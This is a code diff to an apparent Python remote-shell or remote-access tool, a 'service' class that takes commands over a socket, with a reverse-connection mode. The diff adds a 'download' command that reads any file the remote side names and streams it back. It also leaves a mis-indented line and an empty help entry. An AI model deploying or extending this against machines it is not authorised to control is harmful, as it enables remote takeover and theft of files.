@@ -39,7 +39,7 @@ class service(object):
                 host_name = socket.gethostname()
                 info = "[{}@{}] {}>\n>".format(user,host_name,path)
                 try:
-                    sockets.send(info.encode())
+                        sockets.send(info.encode())
                 except:
                     self.conn_server()
                     break
@@ -51,6 +51,7 @@ class service(object):
                 stop = data.decode() == "quit_service"
                 if not stop :
                     ret = self.habit(data.decode())
+                    if ret == 'continue':continue
                     sockets.send(ret.encode())
         if self.reverse:
             sockets.close()
@@ -92,24 +93,27 @@ class service(object):
             value = " "
         elif command[0] == 'upload':
             self.donwload(self.socket)
-            value = " "
+            value = "continue"
+        elif command[0] == 'download':
+            self.upload(self.socket)
+            value = "continue"
         elif command[0] == 'ignore':value=" "   
-
         elif command[0] == 'help':
             value = """
             quit_service: Exit remote sessions and local sessions
             quit Or exit: Exit the current session 
-            upload: Upload files from the console to the remote session 
+            upload: Upload files from the console to the remote session
+            download:  
             """
-        else:value = self.command(value)                
+        else:value = self.command(value)
         return value
-
 
     def donwload(self,sockets):
         first = sockets.recv(4) # 获取报文长度
         header_size = struct.unpack('i', first)[0] # 解码报文
         header_json  = json.loads(sockets.recv(header_size).decode()) #获取报文头
         max_output_size = header_json['max_output_size']
+
         value = open(header_json['filename'],'wb')
         while 1:
             data =  sockets.recv(max_output_size)
@@ -119,5 +123,25 @@ class service(object):
             except:pass
             value.write(data)
         value.close()
+
+
     def upload(self,sockets):
-        pass
+        first = sockets.recv(4) # 获取报文长度
+        header_size = struct.unpack('i', first)[0] # 解码报文
+        header_json  = json.loads(sockets.recv(header_size).decode()) #获取报文头
+        total_size = os.path.getsize(header_json['filename'])
+
+
+        file = open(header_json['filename'], "rb")
+        while 1:
+            buf = file.read(header_json["max_output_size"])
+            if len(buf)<=0:
+                sockets.send('hello_word_file_is_end'.encode())
+                break
+            # sockets.send(buf)
+            sockets.send(str(len(buf)).encode()+b"\xef"+buf)
+        file.close()
+
+
+
+ 
